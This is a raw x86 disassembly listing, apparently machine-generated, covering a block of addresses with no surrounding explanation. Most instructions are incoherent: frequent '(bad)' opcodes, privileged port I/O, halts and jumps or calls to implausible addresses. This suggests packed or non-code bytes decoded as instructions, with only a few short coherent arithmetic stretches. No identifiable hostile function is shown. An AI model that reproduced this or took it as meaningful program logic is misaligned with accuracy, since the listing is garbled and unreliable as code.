  40e868:	sbb    DWORD PTR [ecx+ecx*4],esi
  40e86b:	mov    edx,0x2cc1ab0e
  40e870:	xchg   edi,eax
  40e871:	test   DWORD PTR [ebp-0x7e],edx
  40e874:	and    bh,bh
  40e876:	(bad)  
  40e877:	neg    BYTE PTR [edi-0x66]
  40e87a:	aaa    
  40e87b:	adc    BYTE PTR [eax+0x33],ch
  40e87e:	xlat   BYTE PTR ds:[ebx]
  40e87f:	add    al,0x9e
  40e881:	mov    BYTE PTR [ebp-0x64a03345],ah
  40e887:	jae    0x40e8a6
  40e889:	cmp    ecx,edi
  40e88b:	sbb    DWORD PTR [ebp+esi*4+0x30d1ea22],esi
  40e892:	out    dx,al
  40e893:	jno    0x40e8bd
  40e895:	xor    BYTE PTR ss:[ebp-0x7a],dh
  40e899:	pop    edx
  40e89a:	sbb    eax,0x75bf468d
  40e89f:	mov    ecx,0xacd831b7
  40e8a4:	mov    ebp,0x1bd70ee9
  40e8a9:	cmp    eax,0x8827ff39
  40e8ae:	hlt    
  40e8af:	int3   
  40e8b0:	shl    BYTE PTR [ebx],1
  40e8b2:	adc    DWORD PTR ds:0xd5fbd803,ecx
  40e8b8:	(bad)  
  40e8b9:	dec    esi
  40e8ba:	clc    
  40e8bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8bc:	push   ecx
  40e8bd:	mov    dh,0x7a
  40e8bf:	aaa    
  40e8c0:	call   0xbb1565f
  40e8c5:	xor    al,0x23
  40e8c7:	and    eax,0x5560b354
  40e8cc:	lds    esi,FWORD PTR [esi]
  40e8ce:	ins    BYTE PTR es:[edi],dx
  40e8cf:	imul   DWORD PTR [edi]
  40e8d1:	push   0xffffff97
  40e8d3:	lock in al,dx
  40e8d5:	mov    dl,0xfa
  40e8d7:	call   0xd1f04602
  40e8dc:	sbb    eax,0x72d34b19
  40e8e1:	popa   
  40e8e2:	inc    edi
  40e8e3:	in     al,dx
  40e8e4:	fiadd  WORD PTR [edi+0x4b]
  40e8e7:	iret   
  40e8e8:	dec    eax
  40e8e9:	pop    edx
  40e8ea:	jecxz  0x40e880
  40e8ec:	mov    dh,0x3f
  40e8ee:	out    dx,eax
  40e8ef:	jo     0x40e928
  40e8f1:	push   ecx
  40e8f2:	sahf   
  40e8f3:	(bad)  [ebx-0x59fe0c75]
  40e8f9:	data16 aam 0xe3
  40e8fc:	adc    al,0x5
  40e8fe:	mov    edx,0x5fbe4ef8
  40e903:	inc    edx
  40e904:	or     ebx,DWORD PTR [edi]
  40e906:	inc    esp
  40e907:	adc    al,0xb7
  40e909:	and    eax,0x54de24e4
  40e90e:	and    edx,0xffffff8d
  40e911:	dec    eax
  40e912:	mov    dl,0x3a
  40e914:	int3   
  40e915:	lds    esi,FWORD PTR [edx]
  40e917:	out    dx,al
  40e918:	idiv   DWORD PTR [ecx]
  40e91a:	aas    
  40e91b:	push   ecx
  40e91c:	pusha  
  40e91d:	mov    dl,dh
  40e91f:	and    al,0x19
  40e921:	lea    ecx,[eax+0x5f62fe44]
  40e927:	fs push ebp
  40e929:	gs push ebx
  40e92b:	out    dx,al
  40e92c:	(bad)  
  40e92d:	adc    ecx,DWORD PTR [esp+eax*2-0x46]
  40e931:	and    al,0x11
  40e933:	jle    0x40e967
  40e935:	test   BYTE PTR [edi+0x1e],bh
  40e938:	repnz mov ebx,DWORD PTR [edx]
  40e93b:	xchg   edx,eax
  40e93c:	gs mov bx,0x9f00
  40e941:	icebp  
  40e942:	cmp    al,0x57
  40e944:	mov    dl,0x5e
  40e946:	jmp    0x40e91d
  40e948:	mov    bl,0xae
  40e94a:	and    BYTE PTR [ebp+0x48],ch
  40e94d:	sub    cl,BYTE PTR [eax]
  40e94f:	push   edi
  40e950:	push   ebx
  40e951:	loopne 0x40e94d
  40e953:	js     0x40e95f
  40e955:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e956:	imul   esp,DWORD PTR [ebx-0x4a],0x3fd7a2d
  40e95d:	hlt    
  40e95e:	mov    edi,0x7b23a21a
  40e963:	pop    esi
  40e964:	xor    ah,BYTE PTR [edx+0x1e]
  40e967:	les    edi,FWORD PTR [ebp-0x4e3f631b]
  40e96d:	(bad)  
  40e96e:	sbb    esi,DWORD PTR [edi]
  40e970:	mov    esi,0x93b2da7c
  40e975:	add    al,0x41
  40e977:	out    dx,eax
  40e978:	(bad)  
  40e979:	jb     0x40e94a
  40e97b:	xchg   esi,eax
  40e97c:	adc    al,0xc4
  40e97e:	cdq    
  40e97f:	sbb    DWORD PTR [ecx-0xa],edi
  40e982:	dec    ebp
  40e983:	enter  0xbff0,0x11
  40e987:	repz dec edi
  40e989:	outs   dx,BYTE PTR ds:[esi]
  40e98a:	in     al,dx
  40e98b:	push   edx
  40e98c:	mov    eax,ds:0x778b3758
  40e991:	mov    ah,0x48
  40e993:	popf   
  40e994:	mov    edi,0xab490d8c
  40e999:	cdq    
  40e99a:	mov    bl,0x84
  40e99c:	loop   0x40e9bc
  40e99e:	enter  0xd536,0xec
  40e9a2:	inc    esp
  40e9a3:	sti    
  40e9a4:	mov    al,ds:0xf502b9c
  40e9a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9aa:	inc    edi
  40e9ab:	iret   
  40e9ac:	push   esi
  40e9ad:	add    al,BYTE PTR [edx-0x69673266]
  40e9b3:	add    al,BYTE PTR [esi+0x65]
  40e9b6:	aam    0x2e
  40e9b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9b9:	fwait
  40e9ba:	arpl   bp,bx
  40e9bc:	or     al,0xfc
  40e9be:	in     eax,0xb2
  40e9c0:	(bad)  
  40e9c1:	call   0x2da84640
  40e9c6:	std    
  40e9c7:	jns    0x40e968
  40e9c9:	adc    bh,cl
  40e9cb:	adc    dh,BYTE PTR [ebp+0x4f]
  40e9ce:	call   0x2d56a018
  40e9d3:	sub    esp,DWORD PTR [eax-0x3d521188]
  40e9d9:	jmp    0xf7d0:0x14f2a83d
  40e9e0:	pop    ecx
  40e9e1:	test   bl,cl
  40e9e3:	(bad)  
  40e9e4:	mov    ch,0xc2
  40e9e6:	push   esp
  40e9e7:	ins    BYTE PTR es:[edi],dx
  40e9e8:	dec    edx
  40e9e9:	and    ch,BYTE PTR [eax+0x2576527c]
  40e9ef:	addr16 push edi
  40e9f1:	mov    eax,DWORD PTR [esi-0x6a4adee4]
  40e9f7:	ins    DWORD PTR es:[edi],dx
  40e9f8:	(bad)  
  40e9fa:	int    0x16
  40e9fc:	sub    BYTE PTR [edx-0x49],al
  40e9ff:	adc    eax,0xc30caf58
  40ea04:	fs mov bh,0x3b
  40ea07:	outs   dx,DWORD PTR ds:[esi]
  40ea08:	call   0x442ac707
  40ea0d:	xchg   esp,eax
  40ea0e:	cmp    eax,0x66ccc794
  40ea13:	(bad)  
  40ea14:	popa   
  40ea15:	test   BYTE PTR [ebp+0x2adf8653],ah
  40ea1b:	pop    esp
  40ea1c:	sbb    al,0xd8
  40ea1e:	(bad)  
  40ea1f:	imul   ebp,DWORD PTR [ecx-0x7a4b9c98],0xffffffba
  40ea26:	es fwait
  40ea28:	hlt    
  40ea29:	pop    ss
  40ea2a:	cmp    eax,edx
  40ea2c:	enter  0xf041,0x34
  40ea30:	leave  
  40ea31:	stos   BYTE PTR es:[edi],al
  40ea32:	loop   0x40e9b9
  40ea34:	xor    al,0x75
  40ea36:	mov    al,cl
  40ea38:	lods   al,BYTE PTR ds:[esi]
  40ea39:	sub    eax,0x5c21641f
  40ea3e:	ds mov eax,0x4f4f8749
  40ea44:	shl    DWORD PTR [edi+0x35],cl
  40ea47:	dec    ecx
  40ea48:	jne    0x40eac5
  40ea4a:	sbb    BYTE PTR [edx-0x75],dh
  40ea4d:	sti    
  40ea4e:	inc    esp
  40ea4f:	outs   dx,BYTE PTR ds:[esi]
  40ea50:	in     al,dx
  40ea51:	leave  
  40ea52:	add    eax,0xcb1e9845
  40ea57:	scas   eax,DWORD PTR es:[edi]
  40ea58:	inc    esi
  40ea59:	and    al,0x29
  40ea5b:	pop    ecx
  40ea5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea5d:	inc    ebx
  40ea5e:	mov    edi,0xb4e9afc
  40ea63:	hlt    
  40ea64:	mov    bl,0xa5
  40ea66:	fidivr WORD PTR [edi]
  40ea68:	mov    ebp,0x33cedb2b
  40ea6d:	shl    DWORD PTR [edx-0x5b167b60],0x61
  40ea74:	mov    esp,0xbfecba00
  40ea79:	pop    ebp
  40ea7a:	inc    ecx
  40ea7b:	xor    eax,0xeabcb4ee
  40ea80:	nop
  40ea81:	xchg   edi,eax
  40ea82:	mov    esp,0xfbf707e1
  40ea87:	jle    0x40eb01
  40ea89:	out    dx,eax
  40ea8a:	mov    WORD PTR [edi-0x61adf4f2],?
  40ea90:	dec    eax
  40ea91:	repnz and eax,0x7777c570
  40ea97:	ds fwait
  40ea99:	sbb    ebp,DWORD PTR [ebp+0x519369ec]
  40ea9f:	jbe    0x40eb16
  40eaa1:	ja     0x40ead6
  40eaa3:	shl    bh,cl
  40eaa5:	test   DWORD PTR [ebx+0x42251815],0xd4928b00
  40eaaf:	add    DWORD PTR [eax],eax
  40eab1:	add    BYTE PTR [ebx],ch
  40eab3:	ror    BYTE PTR [ebx+0x48a1045],1
  40eab9:	push   es
  40eaba:	mov    BYTE PTR [edx+ecx*1-0x1c12],al
  40eac1:	mov    eax,DWORD PTR [ebp-0x1c]
  40eac4:	mov    edx,DWORD PTR [ebp-0x18]
  40eac7:	imul   eax,edx
  40eaca:	mov    edx,DWORD PTR [ebp-0x14]
  40eacd:	imul   eax,eax,0x262b
  40ead3:	or     eax,edx
  40ead5:	mov    edx,DWORD PTR [ebp-0x10]
  40ead8:	or     eax,edx
  40eada:	xor    eax,0x59f6
  40eadf:	jmp    0x40eda3
  40eae4:	sub    BYTE PTR [edi-0x3c],0x71
  40eae8:	pushf  
  40eae9:	sbb    bl,BYTE PTR [edx]
  40eaeb:	pop    edx
  40eaec:	mov    ebp,0x3caa14b9
  40eaf1:	cs aaa 
  40eaf3:	push   0xfffffffd
  40eaf5:	mov    eax,0x14d21818
  40eafa:	sbb    BYTE PTR [eax],bl
  40eafc:	out    dx,al
  40eafd:	xchg   DWORD PTR [esi-0x3689a1da],edx
  40eb03:	xor    BYTE PTR [edx+0x142b9632],cl
  40eb09:	in     al,0x42
  40eb0b:	cwde   
  40eb0c:	jge    0x40eab9
  40eb0e:	pop    esp
  40eb0f:	sub    al,0x1e
  40eb11:	xchg   edi,eax
  40eb12:	(bad)  
  40eb14:	lea    esp,[ebp-0x41bbe4a9]
  40eb1a:	mov    esi,DWORD PTR [eax+esi*4]
  40eb1d:	push   esi
  40eb1e:	mov    bh,0xcd
  40eb20:	and    edx,DWORD PTR [esi+0x1f]
  40eb23:	loope  0x40eaef
  40eb25:	xor    eax,0xfcfecf58
  40eb2a:	out    dx,al
  40eb2b:	cmp    eax,0x4398a1d2
  40eb30:	rdpmc  
  40eb32:	add    eax,0xdde58942
  40eb37:	mov    cl,0x9a
  40eb39:	xor    al,bl
  40eb3b:	sub    eax,0xe2e6c72d
  40eb40:	xchg   ebx,eax
  40eb41:	cdq    
  40eb42:	push   eax
  40eb43:	je     0x40ebb4
  40eb45:	dec    esi
  40eb46:	dec    edx
  40eb47:	mov    ch,0x60
  40eb49:	jmp    0x5eac:0xe9b8d1a7
  40eb50:	(bad)  
  40eb52:	jecxz  0x40eb4e
  40eb54:	in     eax,0xf4
  40eb56:	xor    BYTE PTR [ebx+eiz*1],cl
  40eb59:	sub    BYTE PTR [esi+esi*1],dl
  40eb5c:	pop    ebp
  40eb5d:	mov    DWORD PTR [edi],edi
  40eb5f:	add    bh,BYTE PTR [ebx]
  40eb61:	dec    esp
  40eb62:	jbe    0x40eae9
  40eb64:	push   eax
  40eb65:	xchg   ebp,eax
  40eb66:	mov    bh,0xad
  40eb68:	pusha  
  40eb69:	pop    ds
  40eb6a:	and    BYTE PTR [ebx],0x2e
  40eb6d:	mov    bl,0xf3
  40eb6f:	jp     0x40eb33
  40eb71:	lds    ebp,FWORD PTR [esi-0x285b23cb]
  40eb77:	js     0x40ebf7
  40eb79:	test   edi,esi
  40eb7b:	jne    0x40eb3d
  40eb7d:	stos   BYTE PTR es:[edi],al
  40eb7e:	aaa    
  40eb7f:	jns    0x40ebbb
  40eb81:	mov    cl,0x2
  40eb83:	sub    eax,0xb0e4673c
  40eb88:	es dec esp
  40eb8a:	shl    esi,cl
  40eb8c:	int    0x0
  40eb8e:	and    bl,ch
  40eb90:	mov    BYTE PTR [ecx-0x25],bh
  40eb93:	pop    esi
  40eb94:	fiadd  WORD PTR [eax+0x75e36ac5]
  40eb9a:	call   0xd855678a
  40eb9f:	push   esp
  40eba0:	jecxz  0x40eba2
  40eba2:	mov    eax,ds:0xf47e62ed
  40eba7:	ins    BYTE PTR es:[edi],dx
  40eba8:	int3   
  40eba9:	pop    ebx
  40ebaa:	popf   
  40ebab:	cmc    
  40ebac:	mov    DWORD PTR [eax+edi*1],esi
  40ebaf:	push   0x4bf1b2c7
  40ebb4:	push   ss
  40ebb5:	and    dl,cl
  40ebb7:	rol    DWORD PTR [ebp+0x38],cl
  40ebba:	push   esi
  40ebbb:	ret    
  40ebbc:	pop    edx
  40ebbd:	scas   al,BYTE PTR es:[edi]
  40ebbe:	je     0x40ec39
  40ebc0:	lahf   
  40ebc1:	mov    cl,0x3e
  40ebc3:	cld    
  40ebc4:	mov    esp,0xbd18c380
  40ebc9:	inc    esp
  40ebca:	sbb    al,0x73
  40ebcc:	pop    es
  40ebcd:	retf   0x3c69
  40ebd0:	ret    
  40ebd1:	sbb    edx,DWORD PTR [ecx+0xcb70025]
  40ebd7:	std    
  40ebd8:	xor    BYTE PTR [ecx+0x379cc7b1],dh
  40ebde:	sahf   
  40ebdf:	sbb    esi,DWORD PTR [ebx+0x27980a0c]
  40ebe5:	repnz pop esi
  40ebe7:	dec    ebp
  40ebe8:	loope  0x40ec49
  40ebea:	mov    bl,0xcb
  40ebec:	jecxz  0x40ebc1
  40ebee:	xchg   ecx,eax
  40ebef:	inc    ebp
  40ebf0:	jb     0x40eb7e
  40ebf2:	inc    edx
  40ebf3:	stc    
  40ebf4:	call   0x5c808fb4
  40ebf9:	push   esp
  40ebfa:	je     0x40eba5
  40ebfc:	lahf   
  40ebfd:	leave  
  40ebfe:	mov    cl,0xc6
  40ec00:	or     esi,DWORD PTR [eax+0x41]
  40ec03:	sub    al,0x45
  40ec05:	daa    
  40ec06:	loope  0x40ebce
  40ec08:	dec    ecx
  40ec09:	pop    eax
  40ec0a:	dec    ebx
  40ec0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec0c:	out    dx,eax
  40ec0d:	mov    eax,0x7ad8e5a
  40ec12:	sbb    al,0x92
  40ec14:	push   edx
  40ec15:	(bad)  
  40ec16:	nop
  40ec17:	push   esp
  40ec18:	adc    cl,BYTE PTR [esi]
  40ec1a:	fist   DWORD PTR [ebp-0x7fc93494]
  40ec20:	xchg   esi,eax
  40ec21:	out    0xda,eax
  40ec23:	mov    bl,0x6a
  40ec25:	push   ebx
  40ec26:	jae    0x40ebd4
  40ec28:	dec    ecx
  40ec29:	push   es
  40ec2a:	test   DWORD PTR [eax+0x511d5ba],ebp
  40ec30:	push   edx
  40ec31:	and    eax,0x1778164c
  40ec36:	mov    ch,0x2e
  40ec38:	mov    BYTE PTR [ebx-0x47],al
  40ec3b:	sub    eax,0xb945a893
  40ec40:	xchg   BYTE PTR [esi-0x1fc50dba],cl
  40ec46:	shl    DWORD PTR ds:0x1a6c460,cl
  40ec4c:	icebp  
  40ec4d:	pop    esi
  40ec4e:	mov    dh,BYTE PTR [eax]
  40ec50:	in     al,0xea
  40ec52:	shr    eax,cl
  40ec54:	jge    0x40eca7
  40ec56:	or     eax,0x168f9854
  40ec5b:	jl     0x40ecc2
  40ec5d:	inc    ebx
  40ec5e:	fnstsw WORD PTR [edi-0x62]
  40ec61:	adc    al,0x41
  40ec63:	lods   al,BYTE PTR ds:[esi]
  40ec64:	sbb    eax,0x646b44b7
  40ec69:	icebp  
  40ec6a:	push   ss
  40ec6b:	(bad)  
  40ec6d:	not    BYTE PTR [esi]
  40ec6f:	out    0xaf,al
  40ec71:	pop    esi
  40ec72:	inc    esp
  40ec73:	mov    WORD PTR [edi+ebp*2],es
  40ec76:	push   ss
  40ec77:	inc    eax
  40ec78:	and    dl,BYTE PTR [esi+0x76fac133]
  40ec7e:	ins    BYTE PTR es:[edi],dx
  40ec7f:	push   es
  40ec80:	fbld   TBYTE PTR [edi+esi*1]
  40ec83:	and    ch,BYTE PTR [ecx]
  40ec85:	pop    edi
  40ec86:	mov    eax,0x3628038d
  40ec8b:	mov    DWORD PTR [ebp-0x2383cc79],ecx
  40ec91:	mov    bh,0x5e
  40ec93:	mov    edi,0x8f70309c
  40ec98:	dec    eax
  40ec99:	cli    
  40ec9a:	rol    DWORD PTR [edx],cl
  40ec9c:	xchg   esi,ebx
  40ec9e:	push   ebx
  40ec9f:	mov    ah,0x99
  40eca1:	scas   al,BYTE PTR es:[edi]
  40eca2:	adc    DWORD PTR es:[edi-0x7303e685],edi
  40eca9:	lea    ebp,[ebp+0x11]
  40ecac:	scas   eax,DWORD PTR es:[edi]
  40ecad:	push   ebp
  40ecae:	stos   BYTE PTR es:[edi],al
  40ecaf:	jmp    0x21afa9b7
  40ecb4:	popa   
  40ecb5:	fcmovbe st,st(1)
  40ecb7:	sub    BYTE PTR [ecx+ebx*1],dh
  40ecba:	in     eax,0x71
  40ecbc:	stos   BYTE PTR es:[edi],al
  40ecbd:	retf   0x4e49
  40ecc0:	xor    ecx,DWORD PTR [ecx]
  40ecc2:	cmp    eax,0x4039c045
  40ecc7:	xor    ah,BYTE PTR [ebx-0x43]
  40ecca:	ss push ss
  40eccc:	into   
  40eccd:	aam    0x18
  40eccf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ecd0:	lods   al,BYTE PTR ds:[esi]
  40ecd1:	lods   eax,DWORD PTR ds:[esi]
  40ecd2:	rcr    BYTE PTR [eax+ecx*8],0x33
  40ecd6:	sub    dh,BYTE PTR [ebp+ebp*1+0x47]
  40ecda:	mov    eax,ds:0x5f04588
  40ecdf:	pop    edi
  40ece0:	pop    esi
  40ece1:	outs   dx,DWORD PTR ds:[esi]
  40ece2:	dec    ecx
  40ece3:	ins    BYTE PTR es:[edi],dx
  40ece4:	pop    edi
  40ece5:	mov    bh,ch
  40ece7:	xor    al,0x73
  40ece9:	cdq    
  40ecea:	dec    edi
  40eceb:	sbb    bh,BYTE PTR [ecx]
  40eced:	jae    0x40ec99
  40ecef:	inc    esi
  40ecf0:	les    edx,FWORD PTR [edx+0x58f25a6f]
  40ecf6:	add    al,0x86
  40ecf8:	xor    ah,BYTE PTR [ecx]
  40ecfa:	and    esp,DWORD PTR cs:[ecx+0x5a999ab6]
  40ed01:	add    eax,DWORD PTR [esi-0x776e76d6]
  40ed07:	inc    ecx
  40ed08:	test   eax,0xce728380
  40ed0d:	and    BYTE PTR [eax-0x35a6769e],bl
  40ed13:	in     eax,0x52
  40ed15:	popf   
  40ed16:	popa   
  40ed17:	pop    esp
  40ed18:	call   0xe038a7d2
  40ed1d:	xchg   BYTE PTR [eax],al
  40ed1f:	add    BYTE PTR [esi+0x367b357],al
  40ed25:	popf   
  40ed26:	dec    esp
  40ed27:	xchg   BYTE PTR [edi],al
  40ed29:	ja     0x40ecd1
  40ed2b:	pop    ss
  40ed2c:	lods   al,BYTE PTR ds:[esi]
  40ed2d:	mov    al,ds:0x21f64230
  40ed32:	daa    
  40ed33:	jg     0x40ed9d
  40ed35:	add    eax,0xf60e41bf
  40ed3a:	out    dx,al
  40ed3b:	popf   
  40ed3c:	push   cs
  40ed3d:	jmp    0x40edb3
  40ed3f:	mov    ecx,0xc55d9771
  40ed44:	jle    0x40ed5f
  40ed46:	mov    esp,0x8e28a191
  40ed4b:	cdq    
  40ed4c:	pop    ds
  40ed4d:	ins    DWORD PTR es:[edi],dx
  40ed4e:	pop    ebx
  40ed4f:	sbb    al,0x3e
  40ed51:	cmp    eax,0x35be0848
  40ed56:	sbb    BYTE PTR [esi+0x175ed4b6],al
  40ed5c:	in     al,0xe5
  40ed5e:	pop    ss
  40ed5f:	xor    al,0x73
  40ed61:	pop    ds
  40ed62:	in     eax,0x3
  40ed64:	inc    ecx
  40ed65:	imul   esp,ebx,0x54
  40ed68:	loop   0x40ed61
  40ed6a:	daa    
  40ed6b:	ds push edi
  40ed6d:	sub    BYTE PTR [ebx+edi*8+0x509af63b],bh
  40ed74:	pop    ebp
  40ed75:	xchg   BYTE PTR [eax+ebp*2],dl
  40ed78:	mov    eax,ds:0x7cf95b22
  40ed7d:	jae    0x40edb1
  40ed7f:	fnstsw WORD PTR [eax-0x4c]
  40ed82:	cs test eax,0xac5fbbb8
  40ed88:	dec    edx
  40ed89:	pop    ds
  40ed8a:	mov    bl,0xe6
  40ed8c:	push   DWORD PTR [esi-0x5b]
  40ed8f:	xor    eax,0xf2047474
  40ed94:	stos   DWORD PTR es:[edi],eax
  40ed95:	jae    0x40edb6
  40ed97:	ss sbb eax,0x2061b42b
  40ed9d:	cdq    
  40ed9e:	push   esi
  40ed9f:	sbb    edi,DWORD PTR [ebx-0x1d]
  40eda2:	lea    ecx,[ebp+0x59e6018c]
  40eda8:	add    eax,0xf4458b35
  40edad:	and    eax,0xddc
  40edb2:	add    eax,DWORD PTR [ebp-0x8]
  40edb5:	xor    eax,0x46e3
  40edba:	add    eax,0x50eb
  40edbf:	cmp    ecx,eax
  40edc1:	jmp    0x40f085
  40edc6:	cmp    DWORD PTR [edx-0x25e5f4a4],ecx
  40edcc:	daa    
  40edcd:	sub    ch,BYTE PTR [edx+0x33aa1270]
  40edd3:	loopne 0x40eddd
  40edd5:	push   0xffffffb7
  40edd7:	mov    dl,0x18
  40edd9:	sbb    dl,dl
  40eddb:	adc    al,0x18
  40eddd:	sbb    BYTE PTR [edi+0x3a],dl
  40ede0:	shr    DWORD PTR [eax],1
  40ede2:	jmp    0x869a9192
  40ede7:	xor    edx,DWORD PTR [ebx]
  40ede9:	xor    eax,0x98ffabbf
  40edee:	pop    ss
  40edef:	add    DWORD PTR [eax+0x15],ebp
  40edf2:	adc    edx,edx
  40edf4:	xor    DWORD PTR [esp+esi*4],ebp
  40edf7:	inc    BYTE PTR [ebx+0x30aadce5]
  40edfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40edfe:	xchg   ecx,eax
  40edff:	add    DWORD PTR [edi],0xffffffaf
  40ee02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee03:	xchg   esi,eax
  40ee04:	retf   0x9845
  40ee07:	stc    
  40ee08:	add    cl,BYTE PTR [esi]
  40ee0a:	add    al,BYTE PTR [ebx]
  40ee0c:	enter  0xfb69,0x1a
  40ee10:	lods   al,BYTE PTR ds:[esi]
  40ee11:	fs push ecx
  40ee13:	mov    ecx,0x91302db2
  40ee18:	popa   
  40ee19:	mov    esp,0x34e8b6cd
  40ee1e:	js     0x40ee64
  40ee20:	push   es
  40ee21:	ss pusha 
  40ee23:	pop    edx
  40ee24:	pop    ecx
  40ee25:	sub    BYTE PTR [ecx+0x3a],ah
  40ee28:	push   ebx
  40ee29:	fucom  st(1)
  40ee2b:	dec    esi
  40ee2c:	int    0x55
  40ee2e:	lds    edx,FWORD PTR [ecx+0x4b]
  40ee31:	repz inc edx
  40ee33:	mov    ch,0x75
  40ee35:	dec    ebp
  40ee36:	push   cs
  40ee37:	jl     0x40edd1
  40ee39:	xchg   BYTE PTR [edx+edi*2-0x5bd899b],cl
  40ee40:	loopne 0x40ee68
  40ee42:	mov    ch,BYTE PTR [ebx]
  40ee44:	aaa    
  40ee45:	mov    bp,0x38f1
  40ee49:	dec    eax
  40ee4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee4b:	pop    ebx
  40ee4c:	xchg   DWORD PTR [edx],ebp
  40ee4e:	sbb    BYTE PTR [ebp+0x4c856a13],bh
  40ee54:	leave  
  40ee55:	dec    edi
  40ee56:	aad    0x70
  40ee58:	jl     0x40ee3c
  40ee5a:	mov    DWORD PTR [esi-0x1c],ebx
  40ee5d:	sub    eax,0xeec9747f
  40ee62:	test   eax,0x55723938
  40ee67:	inc    edi
  40ee68:	jle    0x40ee89
  40ee6a:	loopne 0x40ee9e
  40ee6c:	cmp    ebx,DWORD PTR [edi-0x486f562c]
  40ee72:	das    
  40ee73:	daa    
  40ee74:	test   al,0x11
  40ee76:	pop    esi
  40ee77:	mov    WORD PTR [edx+0x2f0c4888],?
  40ee7d:	ror    BYTE PTR [esi-0x7e8d363e],1
  40ee83:	xchg   ebx,eax
  40ee84:	push   ds
  40ee85:	dec    ebp
  40ee86:	xor    edi,DWORD PTR [edx-0x9]
  40ee89:	xchg   esp,eax
  40ee8a:	retf   
  40ee8b:	in     eax,0x38
  40ee8d:	push   ds
  40ee8e:	lsl    ebp,WORD PTR [ecx-0x7d]
  40ee92:	ins    DWORD PTR es:[edi],dx
  40ee93:	and    cl,ch
  40ee95:	ss push esp
  40ee97:	call   0xba9e:0x94a5098a
  40ee9e:	xchg   BYTE PTR [ecx+0x14],bh
  40eea1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eea2:	mov    edx,0x8a74613
  40eea7:	rcr    DWORD PTR [eax+ecx*2],cl
  40eeaa:	push   ebx
  40eeab:	cli    
  40eeac:	jge    0x40ef1c
  40eeae:	jg     0x40eed0
  40eeb0:	aad    0x14
  40eeb2:	bound  ecx,QWORD PTR [ecx]
  40eeb4:	in     eax,dx
  40eeb5:	int3   
  40eeb6:	jl     0x40eece
  40eeb8:	sahf   
  40eeb9:	jne    0x40eea5
  40eebb:	sbb    DWORD PTR [ebx],ecx
  40eebd:	inc    esp
  40eebe:	mov    al,0x74
  40eec0:	sub    eax,0x5f2a0149
  40eec5:	(bad)  
  40eec6:	rol    DWORD PTR [esi-0x52],cl
  40eec9:	adc    dl,BYTE PTR [edi]
  40eecb:	xlat   BYTE PTR ds:[ebx]
  40eecc:	push   ecx
  40eecd:	test   BYTE PTR [edi+edi*2-0x5a],0x3a
  40eed2:	adc    DWORD PTR [edx-0x53],esp
  40eed5:	in     eax,0x24
  40eed7:	cmp    esi,eax
  40eed9:	add    esi,esi
  40eedb:	pop    es
  40eedc:	and    al,0x55
  40eede:	cdq    
  40eedf:	pop    esi
  40eee0:	jl     0x40ee72
  40eee2:	xlat   BYTE PTR ds:[ebx]
  40eee3:	push   0xcf907c6c
  40eee8:	mul    DWORD PTR ds:0x54332ea4
  40eeee:	jne    0x40ef61
  40eef0:	shr    DWORD PTR [ebx+edi*1+0x7d],0xf
  40eef5:	cmp    DWORD PTR [ebx-0x41],ecx
  40eef8:	stos   BYTE PTR es:[edi],al
  40eef9:	fs jb  0x40ef3f
  40eefc:	and    al,0x6f
  40eefe:	xchg   DWORD PTR [esi],esi
  40ef00:	out    0x69,al
  40ef02:	in     al,0x86
  40ef04:	and    ch,BYTE PTR [eax]
  40ef06:	jo     0x40ef61
  40ef08:	dec    esp
  40ef09:	push   ss
  40ef0a:	into   
  40ef0b:	add    eax,0x98861491
  40ef10:	adc    BYTE PTR [eax+0x4a],bh
  40ef13:	(bad)  
  40ef14:	out    0x1d,eax
  40ef16:	rcr    esi,cl
  40ef18:	dec    esp
  40ef19:	test   eax,0xb3de9734
  40ef1e:	sub    ah,BYTE PTR [edi]
  40ef20:	pop    edx
  40ef21:	sub    BYTE PTR [edx],dl
  40ef23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef24:	or     al,0x2c
  40ef26:	aam    0x79
  40ef28:	mov    esp,DWORD PTR [esi-0x7dcc55e4]
  40ef2e:	push   ebx
  40ef2f:	or     ah,BYTE PTR [edx-0x3fff2e70]
  40ef35:	jns    0x40eec8
  40ef37:	mov    ?,WORD PTR ds:[bx+di-0x68e0]
  40ef3d:	ss mov ecx,0xe451f3f6
  40ef43:	imul   ecx,DWORD PTR [edx+0x4ee6a4bb],0xec1863f2
  40ef4d:	jmp    0x91157b56
  40ef52:	retf   
  40ef53:	mov    es,WORD PTR [eax+0x2bd08c98]
  40ef59:	lahf   
  40ef5a:	in     al,0xa9
  40ef5c:	sbb    cl,BYTE PTR [ebx-0x49dacc76]
  40ef62:	(bad)  
  40ef63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef64:	mov    ebp,0xdb1cdcf9
  40ef69:	je     0x40efe7
  40ef6b:	retf   0x3a12
  40ef6e:	sbb    BYTE PTR [eax+0x71],al
  40ef71:	fild   WORD PTR ds:0x5299e64c
  40ef77:	jns    0x40efdb
  40ef79:	or     ebp,DWORD PTR [ecx]
  40ef7b:	push   ebp
  40ef7c:	scas   al,BYTE PTR es:[edi]
  40ef7d:	mov    al,0x32
  40ef7f:	and    al,BYTE PTR [eax-0x76b75cba]
  40ef85:	push   eax
  40ef86:	cmp    DWORD PTR [edx+0x55],ebx
  40ef89:	and    eax,0x8a3de265
  40ef8e:	jg     0x40efc8
  40ef90:	test   al,0xb4
  40ef92:	mov    bl,0x5
  40ef94:	test   DWORD PTR [ebp-0x78],eax
  40ef97:	pop    ds
  40ef98:	ror    DWORD PTR [esi-0x451fce9c],1
  40ef9e:	imul   edi,esp,0x30d09584
  40efa4:	das    
  40efa5:	loop   0x40ef3b
  40efa7:	in     al,0xa6
  40efa9:	mov    ds:0x93386016,al
  40efae:	ret    0x8931
  40efb1:	dec    esp
  40efb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
